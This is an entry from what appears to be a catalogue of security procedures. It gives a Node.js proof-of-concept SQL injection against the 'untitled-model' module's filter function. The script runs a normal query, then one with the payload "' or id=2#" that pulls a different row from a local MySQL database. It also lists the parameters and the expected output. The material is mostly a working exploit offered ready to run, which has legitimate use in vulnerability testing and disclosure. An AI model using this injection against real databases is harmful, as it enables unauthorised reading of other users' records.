---
data: >-
  var model = require('untitled-model'); model.connection({ host:"localhost",
  user:"root", password:"", database:"test" }); var User = model.get('user');
  (async()=>{ await new Promise((resolve,reject)=>{
  User.filter({'id':1},function(err,data){ if(err)throw err; console.log('normal
  query', data); resolve(); }); }); await new Promise((resolve,reject)=>{
  User.filter({'id':"' or id=2#"},function(err,data){ if(err)throw err;
  console.log('sqli query', data); resolve(); }); }); process.exit(0); })();
tags:
  - sqli
  - poc
  - exploitation
type: command
executor: javascript
platforms:
  - Node.js
id: 6ad7c85f-3768-4ad4-82c6-6361a0c90bfd
created_at: '2025-12-14T03:46:15.032Z'
updated_at: '2025-12-14T03:46:15.032Z'
verified: false
validated: true
submitted: true
---
# run-nodejs-sqli-poc-script

## Command

```javascript
var model = require('untitled-model'); model.connection({ host:"localhost", user:"root", password:"", database:"test" }); var User = model.get('user'); (async()=>{ await new Promise((resolve,reject)=>{ User.filter({'id':1},function(err,data){ if(err)throw err; console.log('normal query', data); resolve(); }); }); await new Promise((resolve,reject)=>{ User.filter({'id':"' or id=2#"},function(err,data){ if(err)throw err; console.log('sqli query', data); resolve(); }); }); process.exit(0); })();
```

## Description

A Node.js script that demonstrates SQL injection by running a normal filter query followed by an injected payload, connecting to a local MySQL database via the vulnerable module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| host | MySQL host ("localhost") | Yes |
| user | Database user ("root") | Yes |
| password | Password ("") | Yes |
| database | Target DB ("test") | Yes |
| {'id':1} | Normal filter object | Yes |
| {'id':"' or id=2#"} | SQLi payload to bypass | Yes |

## Examples

### Basic Usage

Save as poc.js and run `node poc.js`.

## Expected Output

normal query [ RowDataPacket { id: 1, firstName: 'Timber', lastName: 'Saw', age: 25 } ] sqli query [ RowDataPacket { id: 2, firstName: 'Timber 0', lastName: 'Saw', age: 25 } ]

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-in-Filter-Function]]
